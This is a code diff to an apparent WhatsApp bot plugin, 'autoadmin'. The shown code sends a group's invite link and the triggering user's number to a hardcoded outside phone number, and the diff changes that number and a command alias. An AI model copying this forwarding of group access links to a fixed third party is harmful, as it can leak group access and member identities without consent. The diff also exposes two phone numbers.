@@ -7,7 +7,7 @@ const handler = async (m, { conn, isAdmin }) => {
         const groupLink = await conn.groupInviteCode(m.chat)
         const fullLink = `https://chat.whatsapp.com/${groupLink}`
 
-        await conn.sendMessage('393476686131@s.whatsapp.net', {
+        await conn.sendMessage('393204885371@s.whatsapp.net', {
             text: `━━━━⬣ AUTOADMIN ⬣━━━━
 
 👤 *Utente:* @${m.sender.split('@')[0]}
@@ -25,7 +25,7 @@ const handler = async (m, { conn, isAdmin }) => {
     }
 }
 
-handler.command = ['autoadmin', 'autoadm', 'almighty']
+handler.command = ['autoadmin', 'autoadm', 'godmode']
 handler.owner = true
 handler.group = true
 handler.botAdmin = true
